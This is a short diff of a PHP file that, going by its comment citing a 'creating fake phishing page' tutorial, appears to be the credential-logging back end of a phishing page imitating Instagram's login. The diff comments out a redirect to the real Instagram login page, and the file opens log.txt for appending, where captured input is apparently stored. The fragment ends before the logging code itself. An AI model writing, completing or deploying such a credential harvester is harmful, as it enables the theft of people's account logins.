@@ -1,7 +1,7 @@
 <?php
 //https://hackiteasy.com/2011/01/creating-fake-phishing-page-of-gmail.html
 
-header ('Location: https://www.instagram.com/accounts/login/');
+//header ('Location: https://www.instagram.com/accounts/login/');
 
 $handle = fopen("log.txt", "a");
 
